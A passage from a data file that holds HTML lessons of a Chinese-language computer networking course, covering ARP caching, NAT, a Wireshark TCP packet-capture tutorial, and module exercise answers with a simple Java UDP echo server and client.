data-nodeid="3649" class=""><img src="https://s0.lgstatic.com/i/image6/M01/3C/39/Cgp9HWCJIO-ASE1gAAIXUxAepRs289.png" alt="图片5.png" data-nodeid="3652"></p>\n\n<p data-nodeid="1160"><strong data-nodeid="1316">前面提到这个过程和 DNS 非常相似，采用的是逐级缓存的设计减少 ARP 请求</strong>。发送接口先查询本地的 ARP 表，如果本地没有数据，然后广播 ARP 查询。这个时候如果交换机中有数据，那么查询交换机的 ARP 表；如果交换机中没有数据，才去广播消息给其他接口。<strong data-nodeid="1317">注意，ARP 表是一种缓存，也要考虑缓存的设计</strong>。通常缓存的设计要考虑缓存的失效时间、更新策略、数据结构等。</p>\n<p data-nodeid="1161">比如可以考虑用 TTL（Time To Live）的设计，为每个缓存条目增加一个失效时间。另外，更新策略可以考虑利用老化（Aging）算法模拟 LRU。</p>\n<p data-nodeid="1162">最后请你思考路由器和交换机的异同点。不知道你有没有在网上订购过家用无线路由器，通常这种家用设备也会提供局域网，具备交换机的能力。同时，这种设备又具有路由器的能力。所以，很多同学可能会分不清路由器和交换机。</p>\n<p data-nodeid="1163">总的来说，家用的路由器，也具备交换机的功能。但是当 ARP 表很大的时候，就需要专门的、能够承载大量网络接口的交换设备。就好比，如果用数组实现 ARP 表，数据量小的时候，遍历即可；但如果数据量大的话，就需要设计更高效的查询结构和设计缓存。</p>\n<p data-nodeid="1164">详细的缓存设计原理的介绍，可以参考<a href="https://shenceyun.lagou.com/t/Axo?fileGuid=xxQTRXtVcqtHK6j8" data-nodeid="1324">《重学操作系统》</a>专栏中关于 CPU 缓存的设计，以及 MMU 中 TLB 的设计的内容，分别在以下 3 讲：</p>\n<ul data-nodeid="1165">\n<li data-nodeid="1166">\n<p data-nodeid="1167"><a href="https://kaiwu.lagou.com/course/courseInfo.htm?courseId=478#/detail/pc?id=4610&amp;fileGuid=xxQTRXtVcqtHK6j8" data-nodeid="1330">05 | 存储器分级：L1 Cache 比内存和 SSD 快多少倍？</a></p>\n</li>\n<li data-nodeid="1168">\n<p data-nodeid="1169"><a href="https://kaiwu.lagou.com/course/courseInfo.htm?courseId=478#/detail/pc?id=4634&amp;fileGuid=xxQTRXtVcqtHK6j8" data-nodeid="1335">25 | 内存管理单元： 什么情况下使用大内存分页？</a></p>\n</li>\n<li data-nodeid="1170">\n<p data-nodeid="1171"><a href="https://kaiwu.lagou.com/course/courseInfo.htm?courseId=478#/detail/pc?id=4635&amp;fileGuid=xxQTRXtVcqtHK6j8" data-nodeid="1340">26 | 缓存置换算法： LRU 用什么数据结构实现更合理？</a></p>\n</li>\n</ul>\n<h3 data-nodeid="1172">连接内网</h3>\n<p data-nodeid="1173">有时候，公司内部有多个子网。这个时候一个子网如果要访问另一个子网，就需要通过路由器。</p>\n<p data-nodeid="4211" class=""><img src="https://s0.lgstatic.com/i/image6/M00/3C/42/CioPOWCJIPqACRqBAAJZJ8-Xz9M520.png" alt="图片66.png" data-nodeid="4214"></p>\n\n<p data-nodeid="1175">也就是说，图中的路由器，其实充当了两个子网通信的桥梁。在上述过程中，发送接口不能直接通过 MAC 地址发送数据到接收接口，因为子网 1 的交换机不知道子网 2 的接口。这个时候，发送接口需要通过 IP 协议，将数据发送到路由器，再由路由器转发信息到子网 2 的交换机。这里提一个问题，<strong data-nodeid="1351">子网 2 的交换机如何根据 IP 地址找到接收接口呢</strong>？答案是通过查询 ARP 表。</p>\n<h3 data-nodeid="1176">连接外网（网络地址转换技术，NAT）</h3>\n<p data-nodeid="1177">最后我们讨论下连接外网的问题。</p>\n<p data-nodeid="1178">IPv4 协议因为存在网络地址耗尽的问题，不能为一个公司提供足够的地址，因此内网 IP 可能会和外网重复。比如内网 IP 地址<code data-backticks="1" data-nodeid="1355">192.168.0.1</code>发送信息给<code data-backticks="1" data-nodeid="1357">22.22.22.22</code>，这个时候，其实是跨着网络的。</p>\n<p data-nodeid="4773" class=""><img src="https://s0.lgstatic.com/i/image6/M01/3C/3A/Cgp9HWCJIQWATnKCAAJiZ0IiUQw856.png" alt="图片6.png" data-nodeid="4776"></p>\n\n<p data-nodeid="1180">跨网络必然会通过多次路由，最终将消息转发到目的地。但是这里存在一个问题，寻找的目标 IP 地址<code data-backticks="1" data-nodeid="1363">22.22.22.22</code>是一个公网 IP，可以通过正常的寻址 + 路由算法定位。当<code data-backticks="1" data-nodeid="1365">22.22.22.22</code>寻找<code data-backticks="1" data-nodeid="1367">192.168.0.1</code>的时候，是寻找一个私网 IP，这个时候是找不到的。解决方案就是网络地址转换技术（Network Address Translation）。</p>\n<p data-nodeid="5335" class="te-preview-highlight"><img src="https://s0.lgstatic.com/i/image6/M01/3C/3A/Cgp9HWCJIQ6AX2bSAAF-MBsPxPo191.png" alt="图片7.png" data-nodeid="5338"></p>\n\n<p data-nodeid="1182">NAT 技术转换的是 IP 地址，私有 IP 通过 NAT 转换为公网 IP 发送到服务器。服务器的响应，通过 NAT 转换为私有 IP，返回给客户端。通过这种方式，就解决了内网和外网的通信问题。</p>\n<h3 data-nodeid="1183">总结</h3>\n<p data-nodeid="1184">总结一下，链路层发送数据靠的是 MAC 地址，MAC 地址就好像人的身份证一样。局域网中，数据不可能从一个终端直达另一个终端，而是必须经过交换机交换。交换机也叫作链路层交换机，它的工作就是不断接收数据，然后转发数据。<strong data-nodeid="1379">通常意义上，交换机不具有路由功能，路由器往往具有交换功能</strong>。但是往往路由器交换的效率，不如交换机。已知 IP 地址，找到 MAC 地址的协议，叫作地址解析协议（ARP）。</p>\n<p data-nodeid="1185">网络和网络的衔接，必须有路由器（或者等价的设备）。一个网络的设备不能直接发送链路层分组给另一个网络的设备，而是需要通过 IP 协议让路由器转发。</p>\n<p data-nodeid="1186">那么，通过这一讲的学习，你可以来回答本讲关联的面试题目：网络地址转换协议是如何工作的？</p>\n<p data-nodeid="1187">【<strong data-nodeid="1387">解析</strong>】网络地址解析协议（NAT）解决的是内外网通信的问题。NAT 通常发生在内网和外网衔接的路由器中，由路由器中的 NAT 模块提供网络地址转换能力。从设计上看，NAT 最核心的能力，就是能够将内网中某个 IP 地址映射到外网 IP，然后再把数据发送给外网的服务器。当服务器返回数据的时候，NAT 又能够准确地判断外网服务器的数据返回给哪个内网 IP。</p>\n<p data-nodeid="1188">你可以思考下 NAT 是如何做到这点的呢？需要做两件事。</p>\n<ol data-nodeid="1189">\n<li data-nodeid="1190">\n<p data-nodeid="1191">NAT 需要作为一个中间层替换 IP 地址。 发送的时候，NAT 替换源 IP 地址（也就是将内网 IP 替换为出口 IP）；接收的时候，NAT 替换目标 IP 地址（也就是将出口 IP 替换回内网 IP 地址）。</p>\n</li>\n<li data-nodeid="1192">\n<p data-nodeid="1193">NAT 需要缓存内网 IP 地址和出口 IP 地址 + 端口的对应关系。也就是说，发送的时候，NAT 要为每个替换的内网 IP 地址分配不同的端口，确保出口 IP 地址+ 端口的唯一性，这样当服务器返回数据的时候，就可以根据出口 IP 地址 + 端口找到内网 IP。</p>\n</li>\n</ol>\n<h3 data-nodeid="1194">思考题</h3>\n<p data-nodeid="1195"><strong data-nodeid="1395">最后再给你提一道需要查资料的思考题：IPv6 协议还需要 NAT 吗？</strong></p>\n<p data-nodeid="1196">我建议你拿出几分钟的时间去查一下资料，然后把答案整理在留言区，我们一起讨论。如果你对本次课程有什么建议和疑问，可以在评论区留言。如果你有所收获，也可以推荐给你的朋友。</p>\n<p data-nodeid="1197" class="">这一讲就到这里。发现求知的乐趣，我是林䭽。感谢你学习本次课程，下一讲我们将学习“09 | TCP 实战：如何进行 TCP 抓包调试？”再见！</p>',
        article_title: "08 | 局域网：NAT 是如何工作的？",
        title: "08 | 局域网：NAT 是如何工作的？",
        id: 7273,
      },
      {
        content:
          '<p data-nodeid="94399">这一讲给你带来了一个<strong data-nodeid="94405">网络调试工具——Wireshark</strong>。Wireshark 是世界上应用最广泛的网络协议分析器，它让我们在微观层面上看到整个网络正在发生的事情。</p>\n\n\n\n<p data-nodeid="93535">Wireshark 本身是一个开源项目，所以也得到了很多志愿者的支持。同时，Wireshark 具有丰富的功能集，包括：</p>\n<ol data-nodeid="93536">\n<li data-nodeid="93537">\n<p data-nodeid="93538">深入检查数百个协议，并不断添加更多协议；</p>\n</li>\n<li data-nodeid="93539">\n<p data-nodeid="93540">实时捕获和离线分析；</p>\n</li>\n<li data-nodeid="93541">\n<p data-nodeid="93542">支持 Windows、Linux、macOS、Solaris、FreeBSD、NetBSD，以及许多其他平台；</p>\n</li>\n<li data-nodeid="93543">\n<p data-nodeid="93544">提供 GUI 浏览，也可以通过 TTY；</p>\n</li>\n<li data-nodeid="93545">\n<p data-nodeid="93546">支持 VOIP；</p>\n</li>\n<li data-nodeid="93547">\n<p data-nodeid="93548">支持 Gzip；</p>\n</li>\n<li data-nodeid="93549">\n<p data-nodeid="93550">支持 IPSec。</p>\n</li>\n<li data-nodeid="93551">\n<p data-nodeid="93552">……</p>\n</li>\n</ol>\n<p data-nodeid="93553">是不是觉得Wireshark非常强大？无论你从事哪种开发工作，它都可以帮到你，因此也是面试经常考察的内容。<strong data-nodeid="93661">比如本讲关联的面试题：如何进行 TCP 抓包和调试</strong>？下面请你带着问题，开始今天的学习吧。</p>\n<p data-nodeid="93554"><em data-nodeid="93671">注：你可以到 Wireshark 的主页：</em><a href="https://www.wireshark.org/download.html?fileGuid=xxQTRXtVcqtHK6j8" data-nodeid="93667">https://www.wireshark.org/download.html</a><em data-nodeid="93672">下载 Wireshark。</em></p>\n<p data-nodeid="93555">如果你是一个黑客、网络安全工程师，或者你的服务总是不稳定，就需要排查，那么你会如何 hack 这些网络连接、网络接口以及分析网络接口的封包呢？</p>\n<h3 data-nodeid="93556">接口列表</h3>\n<p data-nodeid="93557" class="">Whireshark 可以帮你看到整个网络交通情况，也可以帮你深入了解每个封包。而且 Whireshark 在 macOS、Linux、Windows 上的操作都是一致的，打开 Wireshark 会先看到如下图所示的一个选择网络接口的界面。</p>\n<p data-nodeid="94976" class=""><img src="https://s0.lgstatic.com/i/image6/M00/3D/40/Cgp9HWCTpVWAMmCIAACa-Lf3Ezk286.png" alt="Drawing 0.png" data-nodeid="94979"></p>\n\n<p data-nodeid="93559">我们要做的第一件事情就是<strong data-nodeid="93696">选择一个网络接口</strong>（<strong data-nodeid="93697">Network Interface</strong>）。Linux 下可以使用<code data-backticks="1" data-nodeid="93688">ifconfig</code>指令看到所有的网络接口，Windows 下则使用 ipconfig。可以看到，上图中有很多网络接口，目前我教学这台机器上，连接路由器的接口是<strong data-nodeid="93698">以太网 2</strong>。另外可以看到，我的机器上还有<code data-backticks="1" data-nodeid="93694">VMware</code>的虚拟网络接口（你的机器可能和我的机器显示的不一样）。</p>\n<h3 data-nodeid="97263" class="">开启捕获功能</h3>\n\n\n\n\n<p data-nodeid="93561">选择好接口之后，点击左上角的按钮就可以开启捕获，开启后看到的是一个个数据条目。</p>\n<p data-nodeid="93562">因为整个网络的数据非常多，大量的应用都在使用网络，你会看到非常多数据条目，每个条目是一次数据的发送或者接收。如下图所示：</p>\n<p data-nodeid="97829" class=""><img src="https://s0.lgstatic.com/i/image6/M00/3D/49/CioPOWCTpV-AAY9XAAFmcX9uc-U085.png" alt="Drawing 1.png" data-nodeid="97832"></p>\n\n<p data-nodeid="93564">以下是具体捕获到的内容：</p>\n<p data-nodeid="98397" class=""><img src="https://s0.lgstatic.com/i/image6/M00/3D/40/Cgp9HWCTpWWAdQPSAAHJ-HWaYz0586.png" alt="Drawing 2.png" data-nodeid="98400"></p>\n\n<ul data-nodeid="93566">\n<li data-nodeid="93567">\n<p data-nodeid="93568">序号（No.）是 Wireshark 分配的一个从捕获开始的编号。</p>\n</li>\n<li data-nodeid="93569">\n<p data-nodeid="93570">时间（Time）是从捕获开始过去的时间戳，具体可以在视图中设置，比如可以设置成中文的年月日等。这里有很多配置需要你自己摸索一下，我就不详细介绍了。</p>\n</li>\n<li data-nodeid="93571">\n<p data-nodeid="93572">源地址和目标地址（Source 和 Destination）是 IP 协议，注意这里有 IPv6 的地址，也有  IPV4 的地址。</p>\n</li>\n<li data-nodeid="93573">\n<p data-nodeid="93574">协议可能有很多种，比如 TCP/UDP/ICMP 等，ICMP 是 IP 协议之上搭建的一个消息控制协议（Internet Control Message Protocol），比如 Ping 用的就是 ICMP；还有 ARP 协议（Address Resolution Protocol）用来在局域网广播自己的 MAC 地址。</p>\n</li>\n<li data-nodeid="93575">\n<p data-nodeid="93576">Length 是消息的长度（Bytes）。</p>\n</li>\n<li data-nodeid="93577">\n<p data-nodeid="93578">Info 是根据不同协议显示的数据，比如你可以看到在TCP 协议上看到Seq 和 ACK。这里的 Seq 和 ACK 已经简化过了，正常情况下是一个大随机数，Whireshark 帮你共同减去了一个初始值。</p>\n</li>\n</ul>\n<h3 data-nodeid="93579">观察 TCP 协议</h3>\n<p data-nodeid="93580">如果你具体选择一个 TCP 协议的捕获，可以看到如下图所示的内容：</p>\n<p data-nodeid="98965" class=""><img src="https://s0.lgstatic.com/i/image6/M00/3D/49/CioPOWCTpXCAQhhpAAA9Uqsah2A016.png" alt="Drawing 3.png" data-nodeid="98968"></p>\n\n<p data-nodeid="93582">然后在这下面可以观察到详情内容：</p>\n<p data-nodeid="99533" class=""><img src="https://s0.lgstatic.com/i/image6/M00/3D/40/Cgp9HWCTpXeAGJAjAADSD8vKBNo956.png" alt="Drawing 4.png" data-nodeid="99536"></p>\n\n<p data-nodeid="93584">我们可以从不同的层面来看这次捕获。从传输层看是 TCP 段；从网络层来看是 IP 封包；从链路层来看是 Frame。</p>\n<p data-nodeid="93585">点开不同层面观察这个 TCP 段，就可以获得对它更具体的认识，例如下图是从 TCP 层面理解这次捕获：</p>\n<p data-nodeid="100101" class=""><img src="https://s0.lgstatic.com/i/image6/M00/3D/40/Cgp9HWCTpYGAGGQaAAE4PBKz5m0260.png" alt="Drawing 5.png" data-nodeid="100104"></p>\n\n<p data-nodeid="93587">你可以看到这次捕获是一次 ACK（见 Flags）字段，从端口 58260 发往 443，那么大概率是 HTTPS 客户端给服务器的响应。</p>\n<h3 data-nodeid="102364" class="">消息视图</h3>\n\n\n\n\n<p data-nodeid="93589">如果你选中一条消息，下面会出现一个消息视图。还有一个二进制视图。二进制视图里面是数据的二进制形式，消息视图是对二进制形式的解读。</p>\n<p data-nodeid="93590">Whireshark 追溯的是最底层网卡传输的 Frame（帧），可以追溯到数据链路层。因此对二进制形式的解读，也就是我们的消息视图也要分层。因为对于同样的数据，不同层的解读是不同的。</p>\n<ul data-nodeid="93591">\n<li data-nodeid="93592">\n<p data-nodeid="93593">最上面是 Frame 数据，主要是关注数据的收发时间和大小。</p>\n</li>\n<li data-nodeid="93594">\n<p data-nodeid="93595">接着是数据链路层数据，关注的是设备间的传递。你可以在这里看到源 MAC 地址和目标 MAC 地址。</p>\n</li>\n<li data-nodeid="93596">\n<p data-nodeid="93597">然后是网络层数据，IP 层数据。这里有 IP 地址（源 IP 地址和目标 IP 地址）；也有头部的 Checksum（用来纠错的）。这里就不一一介绍了，你可以回到“<a href="https://kaiwu.lagou.com/course/courseInfo.htm?courseId=837#/detail/pc?id=7271&amp;fileGuid=xxQTRXtVcqtHK6j8" data-nodeid="93744">06 | IPv4 协议：路由和寻址的区别是什么？</a>”复习这块内容。</p>\n</li>\n<li data-nodeid="93598">\n<p data-nodeid="93599">最下面是传输层数据。 也就是 TCP 协议。关注的是源端口，目标端口，Seq、ACK 等。</p>\n</li>\n<li data-nodeid="93600">\n<p data-nodeid="93601">有的传输层上还有一个 TLS 协议，这是因为用 HTTPS 请求了数据。TLS 也是传输层。TLS 是建立在 TCP 之上，复用了 TCP 的逻辑。</p>\n</li>\n</ul>\n<h3 data-nodeid="93602">观察 HTTP 协议</h3>\n<p data-nodeid="93603">Wireshark 还可以用来观察其他的协议，比如说 HTTP 协议，下图是对 HTTP 协议的一次捕获：</p>\n<p data-nodeid="102924" class=""><img src="https://s0.lgstatic.com/i/image6/M00/3D/40/Cgp9HWCTpY2AEOKnAAE6yRKPJBg745.png" alt="Drawing 6.png" data-nodeid="102927"></p>\n\n<p data-nodeid="93605">可以看到，Wireshark 不仅仅捕获了应用层，还可以看到这次 HTTP 捕获对应的传输层、网络层和链路层数据。</p>\n<h3 data-nodeid="93606">过滤和筛选</h3>\n<p data-nodeid="93607">Wireshark 还提供了捕获的过滤，我们只需要输入过滤条件，就可以只看符合条件的捕获。</p>\n<p data-nodeid="93608">比如我们想分析一次到百度的握手。首先开启捕获，然后在浏览器输入百度的网址，最后通过<code data-backticks="1" data-nodeid="93757">ping</code>指令看下百度的 IP 地址，如下图所示：</p>\n<p data-nodeid="103486" class=""><img src="https://s0.lgstatic.com/i/image6/M00/3D/40/Cgp9HWCTpZWAM_ZDAACDEGeqkD4822.png" alt="Drawing 7.png" data-nodeid="103489"></p>\n\n<p data-nodeid="93610">看到IP 地址之后，我们在 Wireshark 中输入表达式，如下图所示：</p>\n<p data-nodeid="104048" class=""><img src="https://s0.lgstatic.com/i/image6/M00/3D/49/CioPOWCTpZuAdqvyAAJKx2ztVfs457.png" alt="Drawing 8.png" data-nodeid="104051"></p>\n\n<p data-nodeid="93612">这样看到的就是和百度关联的所有连接。上图中刚好是一次从建立 TCP 连接（3 次握手），到 HTTPS 协议传输握手的完整过程。你可以只看从<code data-backticks="1" data-nodeid="93767">192.168.1.5</code>到<code data-backticks="1" data-nodeid="93769">14.215.177.39</code>的请求。</p>\n<p data-nodeid="93613">首先是从客户端（<code data-backticks="1" data-nodeid="93772">192.168.1.5</code>）发出的 SYN 和百度返回的 SYN-ACK，如下图所示：</p>\n<p data-nodeid="104610" class=""><img src="https://s0.lgstatic.com/i/image6/M00/3D/40/Cgp9HWCTpaSAVVd3AACrCY_TI9w061.png" alt="Drawing 9.png" data-nodeid="104613"></p>\n\n<p data-nodeid="93615">然后是客户端返回给百度一个 ACK：</p>\n<p data-nodeid="105172" class=""><img src="https://s0.lgstatic.com/i/image6/M00/3D/40/Cgp9HWCTpaqAc4GfAAA15zGZlCA421.png" alt="Drawing 10.png" data-nodeid="105175"></p>\n\n<p data-nodeid="93617">接下来是 HTTPS 协议开始工作（开始握手）：</p>\n<p data-nodeid="105734" class=""><img src="https://s0.lgstatic.com/i/image6/M00/3D/49/CioPOWCTpa-AKOziAABRvFiPr0Q242.png" alt="Drawing 11.png" data-nodeid="105737"></p>\n\n<p data-nodeid="93619">可以看到 HTTPS 协议通过 TLSv1.2 发送了 Client Hello 到服务端。接下来是 Server 返回给客户端 ACK，然后再发送给客户端一个 Server Hello：</p>\n<p data-nodeid="107129" class=""><img src="https://s0.lgstatic.com/i/image6/M00/3D/49/CioPOWCTpbWARjykAAA7-AoCxcc618.png" alt="Drawing 12.png" data-nodeid="107132"><br>\n<img src="https://s0.lgstatic.com/i/image6/M00/3D/40/Cgp9HWCTpbuAcAuCAAA17DK_mn8422.png" alt="Drawing 13.png" data-nodeid="107136"></p>\n\n\n\n\n<p data-nodeid="93622">之后百度回传了证书：</p>\n<p data-nodeid="107695" class=""><img src="https://s0.lgstatic.com/i/image6/M01/3D/49/CioPOWCTpcCAZ1NdAABB_oCh1OM046.png" alt="Drawing 14.png" data-nodeid="107698"></p>\n\n<p data-nodeid="93624">最后开始交换密钥，直到 HTTPS 握手结束：</p>\n<p data-nodeid="108257" class=""><img src="https://s0.lgstatic.com/i/image6/M00/3D/40/Cgp9HWCTpcaAEOyoAAD6xEQthA8678.png" alt="Drawing 15.png" data-nodeid="108260"></p>\n\n<h3 data-nodeid="93626">报文颜色</h3>\n<p data-nodeid="93627">在抓包过程中，黑色报文代表各类报文错误；红色代表出现异常；其他颜色代表正常传输。</p>\n<p data-nodeid="108819" class=""><img src="https://s0.lgstatic.com/i/image6/M01/3D/40/Cgp9HWCTpcyAFfC8AAHgGuq9ECI016.png" alt="Drawing 16.png" data-nodeid="108822"></p>\n\n<h3 data-nodeid="93629">总结</h3>\n<p data-nodeid="93630">在本讲，我对 Wireshark 做了一次开箱教学，希望你听完我的课程后，在自己的机器中也安装一个这个工具，以备不时之需。</p>\n<p data-nodeid="93631">Wireshark 是个强大的工具，支持大量的协议。还有很多关于 Wireshark 的能力，希望你可以进一步探索，如下图中鼠标右键一次捕获，可以看到很多选项，都是可以深挖的。</p>\n<p data-nodeid="109381" class="te-preview-highlight"><img src="https://s0.lgstatic.com/i/image6/M01/3D/49/CioPOWCTpdOATgr1AADfReXfTIc663.png" alt="Drawing 17.png" data-nodeid="109384"></p>\n\n<p data-nodeid="93633">那么现在你可以尝试来回答我在本讲开头提出的问题：如何进行 TCP 抓包？</p>\n<p data-nodeid="93634">答案就是用工具，例如 Wireshark。</p>\n<h3 data-nodeid="93635">思考题</h3>\n<p data-nodeid="93636"><strong data-nodeid="93818">最后给你留一道实战题目：请你用自己最熟悉的语言，写一个 UDP 连接程序，然后用 Wireshark 抓包</strong>。</p>\n<p data-nodeid="93637">我建议你自己真正实际操作一遍，检验一下自己的学习成果。如果你对本次课程有什么建议和疑问，可以在评论区留言。如果你有所收获，也可以推荐给你的朋友。</p>\n<p data-nodeid="93638">这一讲就到这里，发现求知的乐趣，我是林䭽。感谢你学习本次课程，下一讲是模块二思考题解答，希望你自己完成题目后再来看答案和分析。再见！</p>',
        article_title: "09 | TCP 实战：如何进行 TCP 抓包调试？",
        title: "09 | TCP 实战：如何进行 TCP 抓包调试？",
        id: 7274,
      },
      {
        content:
          '<p data-nodeid="103492">今天我会带你把《<strong data-nodeid="103542">模块二：网络层协议</strong>》中涉及的课后练习题，逐一讲解，并给出每个课时练习题的解题思路和答案。</p>\n<h3 data-nodeid="103493"><a href="https://kaiwu.lagou.com/course/courseInfo.htm?courseId=837#/detail/pc?id=7271&amp;fileGuid=xxQTRXtVcqtHK6j8" data-nodeid="103545">06 | IPv4 协议：路由和寻址的区别是什么？</a></h3>\n<p data-nodeid="103494">【<strong data-nodeid="103555">问题</strong>】<strong data-nodeid="103556">下面这几个地址 127.0.0.1, localhost, 0.0.0.0 有什么不同</strong>？</p>\n<p data-nodeid="103495">【<strong data-nodeid="103564">解析</strong>】<code data-backticks="1" data-nodeid="103562">127.0.0.1</code>是本地回环地址（loopback），发送到 loopback 的数据会被转发到本地应用。</p>\n<p data-nodeid="103496">localhost 指代的是本地计算机，用于访问绑定在 loopback 上的服务。localhost 是一个主机名，不仅仅可以指向 IPv4 的本地回环地址，也可以指向 IPv6 的本地回环地址 [::1]。</p>\n<p data-nodeid="103497"><code data-backticks="1" data-nodeid="103570">0.0.0.0</code>是一个特殊目的 IP 地址，称作不可路由 IP 地址，它的用途会被特殊规定。通常情况下，当我们把一个服务绑定到<code data-backticks="1" data-nodeid="103572">0.0.0.0</code>，相当于把服务绑定到任意的 IP 地址。比如一台服务器上有多个网卡，不同网卡连接不同的网络，如果服务绑定到 0.0.0.0 就可以保证服务在多个 IP 地址上都可以用。</p>\n<h3 data-nodeid="103498"><a href="https://kaiwu.lagou.com/course/courseInfo.htm?courseId=837#/detail/pc?id=7272&amp;fileGuid=xxQTRXtVcqtHK6j8" data-nodeid="103576">07 | IPv6 协议：Tunnel 技术是什么？</a></h3>\n<p data-nodeid="103499">【<strong data-nodeid="103586">问题</strong>】<strong data-nodeid="103587">请你总结下 IPv6 和 IPv4 究竟有哪些区别</strong>？</p>\n<p data-nodeid="103500">【<strong data-nodeid="103597">解析</strong>】I<strong data-nodeid="103598">Pv6 和 IPv4 最核心的区别是地址空间大小不同</strong>。IPv6 用 128 位地址，解决了 IP 地址耗尽问题。因为地址空间大小不同，它们对地址的定义，对路由寻址策略都有显著的差异。</p>\n<p data-nodeid="103501"><strong data-nodeid="103603">在路由寻址策略上</strong>，IPv6 消除了设备间地址冲突的问题，改变了划分子网的方式。在 IPv4 网络中，一个局域网往往会共享一个公网 IP，因此需要 NAT 协议和外网连接。</p>\n<p data-nodeid="103502"><strong data-nodeid="103608">在划分子网的时候</strong>，IPv4 地址少，需要子网掩码来处理划分子网。IPv6 有充足的地址，因此不需要局域网共享外网 IP。也正因为 IPv6 地址多，可以直接将 IPv6 地址划分成站点、子网、设备，每个段都有充足的 IP 地址。</p>\n<p data-nodeid="103503">因为 IPv6 支持的 IP 地址数量大大上升，一个子网可以有 2<sup>48</sup> 个 IP 地址，这个子网可能是公司网络、家庭网络等。这样 IP 地址的分配方式也发生了变化，IPv4 网络中设备分配 IP 地址的方式是中心化的，由 DHCP（动态主机协议）为局域网中的设备分配 IP 地址。而在 IPv6 网络中，因为 IP 地址很少发生冲突，可以由设备自己申请自己的 IP 地址。</p>\n<p data-nodeid="103504">另外因为 IPv6 中任何一个节点都可以是一个组播节点，这样就可以构造一个对等的网络，也就是可以支持在没有中心化的路由器，或者一个网络多个路由器的情况下工作。节点可以通过向周围节点类似打探消息的方式，发现更多的节点。这是一个配套 IPv6 的能力，叫作邻居发现（ND）。</p>\n<h3 data-nodeid="103505"><a href="https://kaiwu.lagou.com/course/courseInfo.htm?courseId=837#/detail/pc?id=7273&amp;fileGuid=xxQTRXtVcqtHK6j8" data-nodeid="103617">08 | 局域网：网络地址转换是如何工作的？</a></h3>\n<p data-nodeid="103506">【<strong data-nodeid="103626">问题</strong>】<strong data-nodeid="103627">IPv6 协议还需要 NAT 吗？</strong></p>\n<p data-nodeid="103507">【<strong data-nodeid="103633">解析</strong>】IPv6 解决了 IP 耗尽的问题，为机构、组织、公司、家庭等网络提供了充足的 IP 资源，从这个角度看是不是就不需要 NAT 协议了呢？</p>\n<p data-nodeid="103508">在没有 IPv6 之前，NAT 是 IP 资源耗尽的主流解决方案。在一个内网中的全部设备通过 NAT 协议共享一个外网的 IPv4 地址，是目前内外网对接的主要方式。IPv6 地址资源充足，可以给全球每个设备一个独立的地址。从这个角度看 IPv6 的确不需要 NAT 协议。</p>\n<p data-nodeid="103509">但是目前的情况，是 IPv6 网络还没有完全普及。尽管很多公司已经支持自己的互联网产品可以使用 IPv6 访问，但是公司内部员工使用的内部网络还是 IPv4。如果要连接 IPv6 和 IPv4 网络，仍然需要 NAT 协议（NAT64），这个协议可以让多个 IPv6 的设备共享一个 IPv4 的公网地址。</p>\n<h3 data-nodeid="103510"><a href="https://kaiwu.lagou.com/course/courseInfo.htm?courseId=837#/detail/pc?id=7274&amp;fileGuid=xxQTRXtVcqtHK6j8" data-nodeid="103638">09 | TCP 实战：如何进行 TCP 抓包调试？</a></h3>\n<p data-nodeid="103511"><strong data-nodeid="103647">【问题</strong>】<strong data-nodeid="103648">请你用自己最熟悉的语言，写一个 UDP 连接程序，然后用 Wireshark 抓包</strong>。</p>\n<p data-nodeid="103512">【<strong data-nodeid="103654">解析</strong>】关于这个实战问题，我以 Java 为例，写了一个回声服务（即客户端发送什么服务段返回什么），以下是服务端程序：</p>\n<pre class="lang-java" data-nodeid="103513"><code data-language="java"><span class="hljs-keyword">var</span> socket = <span class="hljs-keyword">new</span> DatagramSocket(<span class="hljs-number">8888</span>);\n<span class="hljs-keyword">var</span> buf = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">256</span>];\n<span class="hljs-keyword">while</span> (<span class="hljs-keyword">true</span>) {\n&nbsp; &nbsp; DatagramPacket packet\n&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; = <span class="hljs-keyword">new</span> DatagramPacket(buf, buf.length);\n&nbsp; &nbsp; System.out.println(<span class="hljs-string">"try receive..."</span>);\n&nbsp; &nbsp; socket.receive(packet);\n&nbsp; &nbsp; <span class="hljs-keyword">var</span> address = packet.getAddress();\n&nbsp; &nbsp; <span class="hljs-keyword">int</span> port = packet.getPort();\n&nbsp; &nbsp; packet = <span class="hljs-keyword">new</span> DatagramPacket(buf, buf.length, address, port);\n&nbsp; &nbsp; String received\n&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; = <span class="hljs-keyword">new</span> String(packet.getData(), <span class="hljs-number">0</span>, packet.getLength());\n&nbsp; &nbsp; socket.send(packet);\n}\n</code></pre>\n<p data-nodeid="103514">以下是客户端程序：</p>\n<pre class="lang-java" data-nodeid="103515"><code data-language="java">&nbsp; <span class="hljs-keyword">var</span> buf = <span class="hljs-string">"Hello"</span>.getBytes();\n&nbsp; <span class="hljs-keyword">var</span> socket = <span class="hljs-keyword">new</span> DatagramSocket();\n&nbsp; <span class="hljs-keyword">var</span> address = InetAddress.getByName(<span class="hljs-string">"localhost"</span>);\n&nbsp; <span class="hljs-keyword">var</span> packet\n&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; = <span class="hljs-keyword">new</span> DatagramPacket(buf, buf.length, address, <span class="hljs-number">8888</span>);\n&nbsp; socket.send(packet);\n&nbsp; socket.receive(packet);\n&nbsp; String received = <span class="hljs-keyword">new</span> String(\n&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; packet.getData(), <span class="hljs-number">0</span>, packet.getLength());\n&nbsp; System.out.format(<span class="hljs-string">"Server echo : %s\\n"</span>, received);\n</code></pre>\n<p data-nodeid="103516">通过观察上面两段程序，你会发现发送和接收的都是<code data-backticks="1" data-nodeid="103657">Datagram</code>报文。而且服务端和客户端之间不需要建立连接。服务端可以通过读取客户端的地址区分客户端，客户端通过服务端地址和端口发送数据到服务端。</p>\n<h4 data-nodeid="103517">总结</h4>\n<p data-nodeid="103518">这个模块我们围绕局域网和 IP 协议展开，包括 ARP、IPv4、IPv6、NAT 等基本概念，探讨了 IPv6 的工作原理，以及 IPv6 和 IPv4 的兼容策略。IP 协议几乎是网络层的唯一协议，因此是大厂面试最为热门的内容之一。</p>\n<p data-nodeid="103519">你可以通过以下几个维度去理解这部分知识：</p>\n<ol data-nodeid="103520">\n<li data-nodeid="103521">\n<p data-nodeid="103522">最底层设备如何向设备发送信息（MAC 地址、路由器、ARP 